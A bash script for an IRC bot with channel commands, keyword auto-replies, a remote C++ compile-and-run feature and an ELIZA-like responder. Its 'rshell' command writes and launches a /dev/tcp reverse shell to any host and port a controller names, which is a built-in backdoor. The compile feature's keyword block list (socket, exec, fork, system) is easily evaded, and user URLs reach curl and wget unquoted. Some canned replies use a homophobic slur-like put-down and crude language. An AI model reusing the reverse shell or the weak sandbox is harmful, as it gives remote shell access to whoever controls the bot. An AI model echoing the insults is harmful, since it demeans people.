#!/bin/bash

authenticated(){
  SENDER=$1
  RESPOND=$2
  RETURN=$3

  FOUND="false"

  for controller in "${ALLOWED_PM_CONTROLLERS[@]}"; do
    if [ $controller == $SENDER ]; then
       FOUND="true"
    fi
  done

  [ "$FOUND" == "false" ] && message_post $RESPOND "Sorry - you are not a controller" && eval $RETURN=0 && return

  eval $RETURN=1
}

message_post(){
  DESTINATION=$1
  shift
  echo "PRIVMSG $DESTINATION :$*"
}

run_ping(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to ping - you are not a controller" && return

  [ ! -e /bin/ping ] && message_post $1 "No ping utility installed" && return
  [ ! -e /bin/grep ] && message_post $1 "No grep utility installed" && return

  [ ! "$3" ] && message_post $1 "Must supply a host to ping" && return

  message_post $1 "Sending ping to [ $3 ]"

  RESULT=$(/bin/ping -c 1 "$3" | /bin/grep "received")

  message_post $1 "Result [ $RESULT ]"
}

run_join(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to join - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a room to join" && return
  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return

  echo "JOIN $3"
  message_post $1 "Attempted to join room"
}

run_part(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to part - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a room to leave" && return
  [ ! "${3:0:1}" == "#" ] && message_post $1 "Room name [ $3 ] seems bad" && return

  echo "PART $3"
  message_post $1 "Attempted to leave room"
}

run_nick(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change nick - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to specify a new nick" && return
  [ "${3:0:1}" == "#" ] && message_post $1 "Nick [ $3 ] seems bad" && return

  nick="$3"

  echo "NICK $3"
  message_post $1 "Changed nick"
}

run_speak(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable - you are not a controller" && return

  [ ! "$3" ] && message_post $1 "Need to give me a target" && return
  [ $# -lt 4 ] && message_post $1 "Need to give me something to say" && return

  SENDER="$1"
  DEST="$3"
 
  shift 3

  message_post $SENDER "Okay"
  message_post $DEST "$*"

}

run_quit(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to quit - you are not a controller" && return

  message_post $1 "Okay, bye"
  
  shift 2
  echo "QUIT $*"
  sleep 1
  exit 0
}

run_resolve(){
   MATCH=$(echo "$*" | /bin/grep -o -E "(http|https)(:[/][/])([a-z]|[A-Z]|[0-9]|[/=]|[/?]|[&]|[/-]|[/.]|[~])*" 2>/dev/null)

   if [ $? -eq 0 -a "$MATCH" ]; then
      # first resolve the url
      #echo "MATCHED: $MATCH"
      RESULT=$(curl -L "$MATCH" 2>/dev/null)
      echo "$RESULT"
   fi
}

run_reverseshell(){

  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to join - you are not a controller" && return

  [ $ALLOW_REVERSE_SHELL -eq 0 ] && message_post $1 "No reverse shell" && return

  [ ! -x /bin/cat ] && message_post $1 "No cat binary" && return
  [ ! -x /usr/bin/nohup ] && message_post $1 "No nohup" && return
  [ ! -x /bin/chmod ] && message_post $1 "No chmod binary" && return
  [ ! -x /bin/rm ] && message_post $1 "No rm binary" && return

  [ ! "$3" ] && message_post $1 "Must specify a host" && return
  [ ! "$4" ] && message_post $1 "Must specify a port" && return

  message_post $1 "Spawning a forked reverse shell to [$3:$4]..."

  TMPSHELL=$(/bin/mktemp)

  #[ -e $TMP ] && /bin/rm -f /tmp/makeshell

  message_post $1 "Writing a makeshell shell script"
  /bin/cat > $TMPSHELL <<EOF
#!/bin/bash
exec 3<> /dev/tcp/$3/$4
if [ $? != 0 ]; then
   exit 0
fi
/bin/bash 0<&3 1>&3- 2>/dev/null 
rm -f $TMPSHELL
EOF
  /bin/chmod +x $TMPSHELL

  [ ! -x $TMPSHELL ] && message_post $1 "Cannot make shell - failed" && rm -f $TMPSHELL && return
  
  $(/usr/bin/nohup $TMPSHELL $3 $4 >/dev/null </dev/null 2>/dev/null &)
  message_post $1 "Spawned"
}

run_keyword(){
  [ ! "$3" ] && message_post $1 "Please say one of (off|on|clear|add|del)" && return

  #message_post $1 "Attempting to modify keyword stuff ${USE_KEYWORDS} ${#KEYWORDS[*]} "

  if [ "$3" == "off" ]; then

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return
    message_post $2 "Use keywords off"
    USE_KEYWORDS="0"
  elif [ "$3" == "on" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    message_post $2 "Use keywords on"
    USE_KEYWORDS="1"
  elif [ "$3" == "clear" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    KEYWORDS=()
    KEYWORD_RESPONSES=()
  elif [ "$3" == "add" ]; then
    [ ! "$4" ] && message_post $1 "Requires a word" && return
    [ ! "$5" ] && message_post $1 "Requries at least a one word response" && return
   
    SENDER=$2
    shift 3
    KW=$1
    KEYWORDS=("${KEYWORDS[@]}" "$1")
    shift 1
    RSP="$*"
    KEYWORD_RESPONSES=("${KEYWORD_RESPONSES[@]}" "$*")

    message_post $SENDER "Added [ $KW ] with [ $RSP ]"
  elif [ "$3" == "list" ]; then
    [ ! "$4" ] && message_post $1 "Give me a keyword" && return
    I=0
    for found in "${KEYWORDS[@]}"; do
      result=$(echo "$*" | /bin/grep -i "$found")
      if [ "${result}" ]; then
        message_post $2 "Keyword [ ${KEYWORDS[${I}]} ] is [ ${KEYWORD_RESPONSES[$I]} ]"
        return
      fi
      ((I=$I+1))
    done

  elif [ "$3" == "del" ]; then
    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return
    I=0
    for found in "${KEYWORDS[@]}"; do
      result=$(echo "$*" | /bin/grep -i "$found")
      if [ "${result}" ]; then
          KEYWORDS=(${KEYWORDS[@]:0:$I} ${KEYWORDS[@]:$(($I + 1))})
          KEYWORD_RESPONSES=(${KEYWORD_RESPONSES[@]:0:$I} ${KEYWORD_RESPONSES[@]:$(($I + 1))})
          message_post $2 "Removed keyword [ $found ]"
          return
      fi
      (( I=$I+1 ))
    done
  fi

}

run_shorten(){
   [ ! "$3" ] && message_post $2 "Unable to shorten blank url" && return

   URL="http://is.gd/api.php?longurl=$3"
   RESULT=$(/usr/bin/curl $URL)
   message_post $2 "Shortened [ $RESULT ]"
}

GCC_FLAGS="-finput-charset=UTF-8 -O2 -std=c++0x -pedantic-errors -Wfatal-errors -Wall -Wextra -Wno-empty-body -Wno-missing-field-initializers -Wwrite-strings -Wno-deprecated -Wno-unused -Wno-non-virtual-dtor -Wno-variadic-macros -fno-use-linker-plugin -fmessage-length=0 -ftemplate-depth-128 -fno-merge-constants -fno-nonansi-builtins -fno-gnu-keywords -fno-elide-constructors -fstrict-aliasing -fstack-protector-all -Winvalid-pch -D_GLIBCXX_DEBUG -D_GLIBCXX_DEBUG_PEDANTIC -D_GLIBCXX_CONCEPT_CHECKS"

run_controller(){

  SENDER=$1
  RESPOND=$2

  [ ! "$3" ] && message_post $RESPOND "Please say one of (list|add|del)" && return

  if [ "$3" == "list" ]; then
    message_post $RESPOND "Bot Controllers [ ${ALLOWED_PM_CONTROLLERS[@]} ]"
  elif [ "$3" == "add" ]; then
    [ ! "$4" ] && message_post $RESPOND "Must give a name" && return

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    ALLOWED_PM_CONTROLLERS=(${ALLOWED_PM_CONTROLLERS[@]} "$4")
    message_post $RESPOND "Added - [ $4 ]"
  elif [ "$3" == "del" ]; then
    [ ! "$4" ] && message_post $RESPOND "Must give a name" && return

    authenticated $1 $2 RESULT
    [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return

    I=0
    for found in "${ALLOWED_PM_CONTROLLERS[@]}"; do
      if [ "$found" == "$4" ]; then
        ALLOWED_PM_CONTROLLERS=(${ALLOWED_PM_CONTROLLERS[@]:0:${I}} ${ALLOWED_PM_CONTROLLERS[@]:$(($I + 1))})
      fi
      (( I=$I+1 ))
    done
  else
      message_post $RESPOND "Please say one of (list|add|del)"    
  fi
}

run_ticker(){
  SENDER=$1
  CHANNEL=$2
  shift 2

  [ ! "$1" ] && message_post $CHANNEL "Requires a ticker symbol"
  TICKERNAME=$(wget -O- "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | grep time_rtq_ticker | cut -d\" -f17 | cut -d"<" -f2 | cut -d">" -f2)
  TICKERPRICE=$(wget -O- "http://finance.yahoo.com/q?s=${1}&ql=1" 2>/dev/null | grep time_rtq_ticker | cut -d\" -f27 | cut -d"<" -f1 | cut -d">" -f2)

  message_post $CHANNEL "Ticker [ ${TICKERNAME} ] value [ ${TICKERPRICE} ]"
}

run_emote(){
  authenticated $1 $2 RESULT
  [ ${RESULT} -eq 0 ] && message_post $1 "Unable to change kw status - you are not a controller" && return


  [ ! "$3" ] && message_post $1 "Need to give me a dest to emote" && return
  [ $# -lt 4 ] && message_post $1 "Need to give me something to emote" && return

  SENDER="$1"
  DEST="$3"
  
  shift 3
  message_post $SENDER "Okay"
  echo -e "PRIVMSG $DEST :\001ACTION $*\001"
}

run_compile(){

#  authenticated $1 $2 RESULT
#  [ ${RESULT} -eq 0 ] && message_post $1 "Sorry, ${1}, but you are not authorized to compile" && return

  SENDER=$1
  RESPONSE=$2

  shift 2

  [ ! "$*" ] && message_post $RESPONSE "Error - no shit to compile"

  HASMAIN=$(/bin/echo "$*" | /bin/grep -w -E "main")

  BADWORDS=( "socket" "setuid" "setgid" "seteuid" "setegid" "fopen" "open" "creat" "system" "exec" "execl" "execvp" "execp" "execle" "ioctl" "asm" "fork" "vfork" "clone" "execve" "signal" "kill" "popen" "sigaction" "signal" "#include" "ifstream" "ofstream" )

  for badword in "${BADWORDS[@]}"; do
    HASWORD=$(/bin/echo "$*" | /bin/grep -w -o "$badword")
    if [ "${HASWORD}" ]; then
      message_post $RESPONSE "blocked app due to: [ $badword ]" 
      return
    fi
  done


  COUTFILE=$(/bin/mktemp --suffix=.cc)
  OOUTFILE=$(/bin/mktemp --suffix=.o)
  AOUTFILE=$(/bin/mktemp)
  WARNFIL=$(/bin/mktemp)

  /bin/cat > $COUTFILE <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <iostream>
#include <vector>
#include <map>
#include <valarray>
#include <string>
#include <iomanip>
#include <algorithm>
#include <list>
#include <set>
#include <sstream>
#include <stack>

using namespace std;

EOF

  NEEDSTERM="false"

  if [ ! "$HASMAIN" ]; then
      cat >> $COUTFILE <<EOF

int main()
EOF

      [ "${1:0:1}" != "{" ] && $(echo "{" >> $COUTFILE) && NEEDSTERM="true"
  fi
  

  $(set -f && echo "$*" >> $COUTFILE)

  [ "$NEEDSTERM" == "true" ] && $(echo "}" >> $COUTFILE)

  ERRORS=$(/usr/bin/g++ ${GCC_FLAGS} -Dmain="APP_TMP_MAIN_main" -c -o $OOUTFILE $COUTFILE 2>&1)

  if [ "$ERRORS" ]; then
    BADSTUFF=$(echo "$ERRORS" | /bin/grep -o -E -m 1 "(warning\:|error\:).*" )

    message_post $RESPONSE "submitted: ${BADSTUFF}"
    /bin/rm -f $COUTFILE $AOUTFILE $WARNFIL $OOUTFILE

    return
  fi

  /bin/cat >$COUTFILE <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <assert.h>
#include <pthread.h>
#include <iostream>
#include <vector>
#include <map>
#include <valarray>
#include <string>
#include <iomanip>
#include <algorithm>
#include <list>
#include <set>
#include <sstream>
#include <fstream>
#include <stack>

#include <assert.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
//#include <linux/user.h>
#include <sys/syscall.h>
#include <syscall.h>
#include <sys/reg.h>
#include <stdio.h>
#include <stdlib.h>

#include <sys/time.h>
#include <sys/resource.h>

#ifdef __x86_64__
#define SYSCALL_OFF (ORIG_RAX * 8)
#else
#define SYSCALL_OFF (ORIG_EAX * 4)
#endif

using namespace std;

extern int APP_TMP_MAIN_main();

int main()
{

    pid_t childID = fork();

    if( ! childID )
    {
        rlim_t kCpuTime = 2L; /* 2 seconds */
        struct rlimit r1;
        int result = getrlimit(RLIMIT_CPU, &r1);
        if( result != 0 )
        {
            cout << "FAILED: rlimit error" << endl;
            return 0;
        }
        if ( r1.rlim_cur > kCpuTime )
             r1.rlim_cur = kCpuTime;
        result = setrlimit( RLIMIT_CPU, &r1 ); 
        
        if( result != 0 )
        {
            cout << "FAILED: rlimit error" << endl;
            return 0;
        }

        //ptrace(PTRACE_TRACEME, 0, NULL, NULL); /* trace me */
        APP_TMP_MAIN_main();
        return 0;
    }

    if( childID < 0 )
    {
        cout << "FAILED: ptrace/fork error" << endl;
        return 0;
    }

    int status;
    wait (&status);

    if ( WIFEXITED(status) )
       return 0;

    assert( WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP );

//    assert( ptrace(PTRACE_SETOPTIONS, childID, NULL, PTRACE_O_TRACESYSGOOD) != -1 );

    do
    {
//       assert( ptrace(PTRACE_SYSCALL, childID, NULL, NULL) != -1 );
       assert( wait(&status) != -1 );

       if (WIFEXITED(status)) break;

       if (WSTOPSIG(status) == (SIGTRAP | 0x80))
       {
           cout << "syscall trap" << ptrace(PTRACE_PEEKUSER, childID, SYSCALL_OFF, NULL) << endl;
       }
       else
       {
           assert( WSTOPSIG(status) == SIGTRAP );
           cout << "Non-syscall trap" << endl;
       }
       
    }while(1);

    return 0;
}

EOF

  ERRORS=$(/usr/bin/g++ -fpermissive -o $AOUTFILE $COUTFILE $OOUTFILE 2>&1 )
  if [ "$ERRORS" -a $? -eq 1 ]; then
    BADSTUFF=$(echo "$ERRORS" | /bin/grep -o -E -m 1 "(warning\:|error\:|undefined).*" )

    message_post $RESPONSE "precomp: ${BADSTUFF}"
    /bin/rm -f $AOUTFILE $WARNFIL $OOUTFILE

    return
  fi

  /bin/cat >$WARNFIL <<EOF
#!/bin/bash
ulimit -t 2
#ulimit -u 5
$AOUTFILE
EOF

  /bin/chmod +x $WARNFIL

  RESULT=$( ${WARNFIL} 2>&1 )
 
  /bin/rm -f $COUTFILE $AOUTFILE $WARNFIL $OOUTFILE

  message_post $RESPONSE "$RESULT"
}

run_rot13(){
  SENDER=$1
  RESPOND=$2
  shift 2
  ROTMSG=$(echo "$*" | /usr/bin/tr 'a-zA-Z' 'n-za-mN-ZA-M')
  message_post $RESPOND "$ROTMSG"
}

run_mycmd(){

  SENDER="$1"
  RESPOND="$1"
  KW="$2"

  shift 2

  if [ "$KW" == "uptime" ]; then
    [ ! -e /usr/bin/uptime ] && message_post $SENDER "Sorry - no uptime binary" && return
    UPTIME=$(/usr/bin/uptime)
    message_post $SENDER "Uptime - $UPTIME"
  elif [ "$KW" == "sysinfo" ]; then
    [ ! -e /bin/uname ] && message_post $SENDER "No uname binary found" && return
    UNAME=$(/bin/uname -a)
    message_post $SENDER "Uname - $UNAME"
  elif [ "$KW" == "id" ]; then
    [ ! -e /usr/bin/id ] && message_post $SENDER "No id binary" && return
    IDINFO=$(/usr/bin/id)
    message_post $SENDER "ID [ $IDINFO ]"
  elif [ "$KW" == "keywords" ]; then
    message_post $SENDER "Keywords [ ${KEYWORDS[@]} ]"
  elif [ "$KW" == "ping" ]; then
    run_ping $SENDER $RESPOND $*
  elif [ "$KW" == "rshell" ]; then
    run_reverseshell $SENDER $RESPOND $*
  elif [ "$KW" == "nick" ]; then
    run_nick $SENDER $RESPOND $*
  elif [ "$KW" == "join" ]; then
    run_join $SENDER $RESPOND $*
  elif [ "$KW" == "part" ]; then
    run_part $SENDER $RESPOND $*
  elif [ "$KW" == "speak" ]; then
    run_speak $SENDER $RESPOND $*
  elif [ "$KW" == "emote" ]; then
    run_emote $SENDER $RESPOND $*
  elif [ "$KW" == "keyword" ]; then
    run_keyword $SENDER $RESPOND $*
  elif [ "$KW" == "controller" ]; then
    run_controller $SENDER $RESPOND $*
  elif [ "$KW" == "ticker" ]; then
    run_ticker $SENDER $RESPOND $*
  elif [ "$KW" == "shorten" ]; then
    run_shorten $SENDER $SENDER $*
  elif [ "$KW" == "quit" ]; then
    run_quit $SENDER $RESPOND "$*"
  elif [ "$KW" == "rot13" ]; then
    run_rot13 $SENDER $RESPOND "$*"
  else
    message_post $SENDER "Unknown command: [$KW]"
  fi

  return
}

handler_callback_tome(){
  debug "tome ARGS: $*"

  SENDER="$1"

  ACTION="${2:1}"

  shift 2

  if [ "${ACTION:0:1}" == \! ]; then
     run_mycmd $SENDER "${ACTION:1}" $*
  else
     message_post $1 "Unable to recognize your request [$*]"
  fi

  return
}


#############################################################################
##
## CHANNEL
##
#############################################################################

handler_callback_tochan(){
  debug "TOCHAN ARGS: $*"

  SENDER="$1"
  CHANNEL="$2"

  shift 2

  if [ "${1:1:1}" == \! ]; then
    if [ "${1:2}" == "uptime" ]; then
      UPTIME=$(/usr/bin/uptime)
      message_post $CHANNEL "$UPTIME"
    elif [ "${1:2}" == "explode" ]; then
      [ ! "$2" ] && message_post $CHANNEL "Explode requires a URL dumbass" && return
      URL=$(curl -I -s "$2" | fgrep 'Location:' | cut -d" " -f2)
      message_post $CHANNEL "Exploded url: $URL "
    elif [ "${1:2}" == "keywords" ]; then
      message_post $CHANNEL "Recognized keywords [ ${KEYWORDS[@]} ]"
    elif [ "${1:2}" == "keyword" ]; then
      shift
      run_keyword $SENDER $CHANNEL $*
    elif [ "${1:2}" == "ticker" ]; then
      shift
      run_ticker $SENDER $CHANNEL $*
    elif [ "${1:2}" == "controller" ]; then
      shift
      run_controller $SENDER $CHANNEL $*
    elif [ "${1:2}" == "shorten" ]; then
      shift
      run_shorten $SENDER $CHANNEL $*
    elif [ "${1:2}" == "join" ]; then
      shift
      run_join $SENDER $CHANNEL $*
    elif [ "${1:2}" == "compile" ]; then
      shift
      run_compile $SENDER $CHANNEL $*
    elif [ "${1:2}" == "rot13" ]; then
      shift
      run_rot13 $SENDER $CHANNEL "$*"
    elif [ "${1:2}" == "doctor" ]; then
      [ ! "${2}" ] && message_post $CHANNEL "Doctor is ${DRBOT}" && return
      authenticated $SENDER $CHANNEL RESULT
      [ ${RESULT} -eq 0 ] && message_post $CHANNEL "Sorry, $SENDER, but you can't change this doctor" && return
      [ "${2}" == "on" ] && DRBOT="on" && message_post $CHANNEL "Dr - $DRBOT" && return
      [ "${2}" == "off" ] && DRBOT="off" && message_post $CHANNEL "Dr - $DRBOT" && return
      message_post $CHANNEL "I only understand on/off"
    elif [ "${1:2}" == "help" ]; then
      message_post $CHANNEL "I understand any of [uptime|explode|keywords|keyword|controller|shorten|join|part|compile|rot13|doctor|quit]"
    elif [ "${1:2}" == "part" ]; then
      shift
      run_part $SENDER $CHANNEL $CHANNEL
    elif [ "${1:2}" == "facebook" ]; then
      shift
      message_post $CHANNEL "Facebook: because even when you're taking a shit, you need ignorant fucking political discussion"
    elif [ "${1:2}" == "XenithOS" ]; then
      shift
      message_post $CHANNEL "it's gay"
    elif [ "${1:2}" == "quit" ]; then
      shift
      run_quit $SENDER $CHANNEL "$*"
    fi
#    else
#        message_post $SENDER "Channel command [ ${1:2} ] not supported"
#    fi

    return
  fi

  if [ "${USE_KEYWORDS}" == "1" ]; then
      I=0
      for found in "${KEYWORDS[@]}"; do
        result=$(echo "$*" | /bin/grep -i "$found")
        if [ "${result}" ]; then
            RESPONSE="${KEYWORD_RESPONSES[${I}]}"
            SEDLINE="s/%SENDER%/${SENDER}/g"
            FORMATTED_RSP=$(echo "$RESPONSE" | /bin/sed $SEDLINE)
  
            check_title=$(echo "$FORMATTED_RSP" | /bin/grep "%URL_TITLE%")
            if [ "$check_title" ]; then
               HTTP_TEXT=$(run_resolve "$*")
               TITLE=$(echo "${HTTP_TEXT}" | /bin/grep -o "<title>.*</title>" | /bin/sed "s@<title>@@g" | /bin/sed "s@</title>@@g" )
               debug "$SENDER asked for $TITLE from $*"
               if [ "$TITLE" ]; then
                  SEDLINE="s@%URL_TITLE%@$TITLE@g"
                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | /bin/sed "${SEDLINE}")
               else
                  SEDLINE="s@%URL_TITLE%@(No Title)@g"
                  FORMATTED_RSP=$(echo "$FORMATTED_RSP" | /bin/sed "${SEDLINE}")
               fi
            fi

            message_post $CHANNEL "${FORMATTED_RSP}"
            return
        fi
        (( I=$I+1 ))
      done
  fi

  if [ "$DRBOT" == "on" ]; then
    if [ "$1" == ":${nick}" -o "$1" == ":$nick:" -o "$1" == ":$nick," ]; then
      shift
      INPUTLINE=$(echo "$*" | tr "[a-z]" "[A-Z]" | /bin/sed 's/^/ /; s/$/ /; s/\./ /g; s/ I / i /g; s/ I.M / i am /g; s/ YOU ARE/ you are/g; s/ AM / am /g; s/ ME / me /g; s/ YOU / you /g; s/ MY / my /g; s/ YOUR / your /g; s/ MINE / mine /g; s/ ARE / are /g; s/ me / YOU /g; s/ my / YOUR /g; s/ your / IRCBOTS /g; s/ i / YOU /g; s/ am / ARE /g;s/ mine / YOURS /g; s/ are / IS /; s/ you / IRCBOT /; s/^ //; s/ $//')
      #message_post $SENDER $INPUTLINE
      case "$INPUTLINE" in
        *YOU\ ARE\ *)
            INPUTLINE=$(echo "${INPUTLINE}?" | /bin/sed 's/^.*YOU\ ARE/WHY DO YOU THINK YOU ARE/')
            ;;
        *YOU\ HAVE\ *)
            INPUTLINE=$(echo "${INPUTLINE}?" | /bin/sed 's/^.*YOU\ HAVE/HOW LONG HAVE YOU HAD/')
            ;;
        WHY\ DOES*|WHY\ DO*)
            INPUTLINE=$(echo "${INPUTLINE}?" | /bin/sed 's/^WHY\ \(DO\|DOES\) //')
            INPUTLINE="why do you think that $INPUTLINE"
            ;;
        YOU*)
            INPUTLINE="when did you first realize that ${INPUTLINE}?"
            ;;
        *BECAUSE*)
            STATEMENT=$(echo "${INPUTLINE}?" | /bin/sed 's/^.*BECAUSE //')
            INPUTLINE="are you sure ${STATEMENT}"
            ;;
        *DO\ IRCBOT\ THINK*)
            INPUTLINE="can't you answer that yourself?"
            ;;
        *IRCBOTS*)
            INPUTLINE="let's keep the conversation on something else please"
            ;;
        *IRCBOT\ IS*|IRCBOT\ IS*)
            STATEMENT=$(echo "$INPUTLINE" | /bin/sed 's/^.*IRCBOT IS //')
            INPUTLINE="I do not think I am $STATEMENT"
            ;;
        *TOUCHY*|*TESTY*|*ANGRY*|*MAD*|*HAPPY*|*SAD*|*EXCITED*)
            INPUTLINE="I have no emotions. That said, why have you interpreted my statement as such?"
            ;;
        *ARE\ IRCBOT*|*IS\ IRCBOT*|ARE\ IRCBOT*|IS\ IRCBOT*)
            STATEMENT=$(echo "$INPUTLINE" | /bin/sed "s/^.*\(ARE\|IS\) IRCBOT //")
            INPUTLINE="do you think I am ${STATEMENT}?"
            ;;
        *IS\ *\'S*|*DOES\ *\'S*|IS\ *\'S*|DOES\ *\'S*)
            PERSON=$(echo "$INPUTLINE" | /bin/sed "s/^.*\(DOES\|IS\) \(.*'S\) \(.*\)/\2/" | /usr/bin/cut -d"'" -f1)
            INPUTLINE="you should ask $PERSON"
            ;;
        IS\ AWESOME|IS\ GOOD|IS\ GREAT)
            INPUTLINE="thank you"
            ;;
        IS\ AWESOME\ AT*|IS\ GOOD\ AT*|IS\ GREAT\ AT*|IS\ GAY)
            INPUTLINE="i am not sure about that"
            ;;
        SUCKS\ AT*|STINKS\ AT*)
            INPUTLINE="i have no doubt this is correct"
            ;;
        IRCBOT\ SUCKS|IRCBOT\ SUCKS*|*IRCBOT\ SUCKS*|*IRCBOT\ SUCKS|IS\ *|SUCKS*)
            INPUTLINE="and you are a ray of sunshine?"
            ;;
        YES*)
            INPUTLINE="why do you think this is so?"
            ;;
        NO*)
            INPUTLINE="Why are you being negative?"
            ;;
          *)
            INPUTLINE="Why do you say ${INPUTLINE}?"
            ;;
      esac
      INPUTLINE=$(echo "$INPUTLINE" | /usr/bin/tr "[A-Z]" "[a-z]")
      message_post $CHANNEL "$SENDER, $INPUTLINE"
    fi
  fi
}
